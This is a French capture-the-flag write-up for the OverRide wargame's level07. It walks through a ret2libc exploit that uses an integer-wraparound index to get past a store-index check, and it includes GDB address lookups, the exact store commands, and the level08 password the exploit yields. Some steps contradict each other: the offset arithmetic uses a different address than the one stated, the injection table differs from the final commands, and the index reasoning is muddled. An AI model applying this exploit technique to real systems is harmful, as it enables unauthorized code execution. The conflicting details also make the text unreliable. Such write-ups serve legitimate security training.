## Exploitation du Level07 - OverRide

### 1. Analyse des protections

```bash
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   Canary found      NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level07/level07
```

* **Partial RELRO** : la GOT est modifiable.
* **Canary found** : protection contre les buffer overflows sur la stack.
* **NX disabled** : exécution de la stack possible (mais on ne va pas l'utiliser).
* **No PIE** : l'exécutable est à adresse fixe, donc les offsets sont stables.

### 2. Objectif : Ret2libc

Pas de fonction `system()` dans la PLT, donc on va aller chercher la libc chargée en mémoire.

```bash
(gdb) p system
$1 = 0xf7e6aed0
(gdb) p exit
$2 = 0xf7e5eb70
(gdb) find 0xf7e2c000, 0xf7fd0000, "/bin/sh"
0xf7f897ec
```

### 3. Fonctionnement du programme

Le programme nous propose 3 commandes :

* `store` : stocker un entier à un index
* `read` : lire la valeur à un index
* `quit` : quitte le programme

Il y a une condition dans la fonction `store` qui empêche d'écrire à un index multiple de 3, ou dont `(value >> 24) == 0xb7`. Cette protection empêche des écritures arbitraires directes.

### 4. Localisation du buffer et de l'EIP

Le buffer commence à :

```assembly
sub $0x1d0, %esp  => buffer = esp + 0x0
lea 0x24(%esp), %ebx => buffer + 0x24
```

Pour écraser `EIP`, on regarde dans GDB :

```bash
esp + 0x24 = 0xffffd548
saved eip = 0xffffd71c
```

Donc l'offset entre le début du buffer et `EIP` est :

```bash
0xffffd71c - 0xffffd554 = 0x1c8 = 456 bytes
456 / 4 = 114 -> index à écraser = 114
```

Mais `114 % 3 == 0` donc bloqué par la protection.

### 5. Contourner la protection

Pour contourner `index % 3 == 0`, on dépasse l'overflow :

```c
index = (0xffffffff / 4) + 114 + 1 = 1073741938
```

Pourquoi ?

* `0xffffffff / 4` : on fait un wrap autour de l'espace d'adresse
* `+114` : offset pour arriver sur `EIP`
* `+1` : pour éviter `%3 == 0`

### 6. Données à injecter

| Adresse    | Valeur                 | Rôle         | Index      |
| ---------- | ---------------------- | ------------ | ---------- |
| 0x080489f1 | RET adresse (main+...) | retourne ici | 1073741938 |
| 0xf7e5eb70 | `exit()`               | pour sortir  | 115        |
| 0xf7f897ec | "/bin/sh"              | argument     | 116        |

> Attention : l'ordre est à adapter selon le stack layout

### 7. Exploitation finale

```bash
Input command: store
Number: 4159090384   # 0xf7e6aed0 => system()
Index: 1073741938

Input command: store
Number: 4159028848   # 0xf7e5eb70 => exit()
Index: 115

Input command: store
Number: 4160264172   # 0xf7f897ec => /bin/sh
Index: 116

Input command: quit
```

Shell obtenu :

```bash
$ cat /home/users/level08/.pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
```

---

**Remarque** : cette technique repose sur l'analyse fine du buffer, des registres (via GDB), des protections actives, et du comportement exact du programme.

---

*Fichier par : [Moouahab]*
